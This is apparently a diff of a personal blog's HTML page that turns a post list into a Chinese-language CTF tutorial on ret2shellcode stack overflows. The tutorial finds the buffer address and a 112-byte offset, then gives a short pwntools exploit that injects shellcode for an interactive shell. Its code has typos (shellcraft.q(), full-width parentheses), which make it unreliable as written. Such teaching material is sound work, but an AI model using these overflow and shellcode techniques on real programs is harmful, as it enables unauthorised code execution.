@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>nianchu</title>
+<title>shellcode 基础 | nianchu</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
@@ -12,14 +12,21 @@
 <link rel="stylesheet" href="https://cc-nianchu.github.io/styles/main.css">
 
 
+  
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/disqusjs@1.1/dist/disqusjs.css" />
+  
+
 
 <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
 <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
 
 
 
-    <meta name="description" content="nianchu的blog">
-    
+    <meta name="description" content="shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。
+ret2shellco..." />
+    <meta name="keywords" content="" />
   </head>
   <body>
     <div id="app" class="main">
@@ -89,17 +96,12 @@
 
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
-          
-            <article class="post-item">
-              <div class="left">
-                <a href="https://cc-nianchu.github.io/post/shellcode-ji-chu/">
-                  <h2 class="post-title">shellcode 基础</h2>
-                </a>
-                <div class="post-date">
-                  2021-07-14
-                </div>
-                <div class="post-abstract">
-                  <p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
+          <div class="post-detail">
+            <h2 class="post-title">shellcode 基础</h2>
+            <div class="post-date">2021-07-14</div>
+            
+            <div class="post-content" v-pre>
+              <p>shellcode原理就是让程序中某个函数执行结束后，返回到shellcode的地址去执行shellcode，目的是为了获取shell，shellcode是栈溢出中一种简单且常规的操作，需要配合rop等技术一起使用。<br>
 ret2shellcode题型喝ret2text差不多，但ret2shellcode没有/bin/sh 后门直接利用的地址，因此我们需要自己构造shellcode。<br>
 shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
 题目ret2shellcode，做题前需要checksec一下有什么保护以及是多少位的程序</p>
@@ -126,40 +128,47 @@ shellcode（指令为:shellcode = asm(shellcraft.sh())）<br>
 </code></pre>
 <p>很明显跟ret2text一样 有gets（）函数和strncpy函数，gets函数是不限制输入内容，仅收到回车后结束，即有溢出                                  //gets（），直接读取一行，忽略'\x00'<br>
 我们先找buf2的地址作为shellcode 地址   在ida32很容易发现</p>
-
-                </div>
-              </div>
-              
-            </article>
-          
-            <article class="post-item">
-              <div class="left">
-                <a href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
-                  <h2 class="post-title">构造基本rop</h2>
-                </a>
-                <div class="post-date">
-                  2021-07-14
-                </div>
-                <div class="post-abstract">
-                  <pre><code> 能构造rop的题目得满足一下条件：
-        程序存在溢出，并且可以控制返回地址。
-        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
+<!-- more -->
+<p>.bss:0804A080    buf2            db 64h dup(?)           ;</p>
+<!-- more -->
+<p>然后确定栈溢出覆盖返回地址的位置，可以手动计算，这里使用cyclic；<br>
+cyclic pattern是一个很好用的功能，pattern就是指一个字符串。在完成溢出题目时，使用cyclic pattern可以大大减少计算溢出点的时间。<br>
+<img src="https://cc-nianchu.github.io/post-images/1626265826546.png" alt="" loading="lazy"><br>
+可以发现在0x62616164中溢出<br>
+输入cyclic -l 0x0626164  可以得到偏移量为112<br>
+因此我们可以构造payload<br>
+payload=shellcode.ljust(112,'a')+p32（0x0804A080)<br>
+EXP如下</p>
+<pre><code>from pwn import*
+q=process('./ret2shellcode')
+shellcode =asm(shellcraft.q())
+payload=shellcode.ljust(112,'a')+p32（0x0804A080)
+q.sendline(payload)
+q.interactive()
 </code></pre>
-<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳<br>
-题目ret2text<br>
-ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
-做题目前首先得查看一下程序的保护机制</p>
 
-                </div>
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
+                  <h3 class="post-title">
+                    构造基本rop
+                  </h3>
+                </a>
               </div>
-              
-            </article>
-          
+            
 
-          <div class="pagination-container">
-  
-  
-</div>
+            
+              
+
+              
+                <div id="disqus_thread" data-aos="fade-in"></div>
+              
+            
+
+          </div>
 
         </div>
       </div>
@@ -185,6 +194,26 @@ var app = new Vue({
     hljs.initHighlightingOnLoad()
   </script>
 
+
+
+
+  
+
+  
+    <script src="https://unpkg.com/disqusjs@1.1/dist/disqus.js"></script>
+    <script>
+
+    var options = {
+      shortname: '',
+      apikey: '',
+    }
+    if ('') {
+      options.api = ''
+    }
+    var dsqjs = new DisqusJS(options)
+
+    </script>
+  
 
 
 
